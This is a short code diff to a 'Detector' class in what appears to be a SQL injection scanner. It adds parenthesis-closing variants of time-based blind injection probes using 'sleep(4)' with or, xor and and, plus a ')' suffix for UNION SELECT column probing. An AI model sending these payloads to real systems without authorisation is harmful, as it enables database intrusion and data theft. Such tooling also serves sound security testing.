@@ -151,10 +151,13 @@ class Detector:
         probes = [
             ("", f"{base} or sleep(4)#"),
             ("'", f"{base}'or sleep(4)#"),
+            (")", f"{base})or(sleep(4))#"),
             ("", f"{base} xor sleep(4)#"),
             ("'", f"{base}'xor sleep(4)#"),
+            (")", f"{base})xor(sleep(4))#"),
             ("", f"{base} and sleep(4)#"),
             ("'", f"{base}'and sleep(4)#"),
+            (")", f"{base})and(sleep(4))#"),
         ]
         for closure, payload in probes:
             if self.s.stopped:
@@ -192,7 +195,7 @@ class Detector:
         for mode in ("classic", "tab", "tab-mixed", "paren", "paren-mixed",
                      "inline"):
             base_mode = mode.split("-")[0]
-            for suffix in ("'", '"', "", "')", '")'):
+            for suffix in ("'", '"', "", ")", "')", '")'):
                 for cols in (2, 3, 4, 5):
                     nums = [str(9137 + i * 13) for i in range(cols)]
                     core = apply_form(f"union select {','.join(nums)}", base_mode)
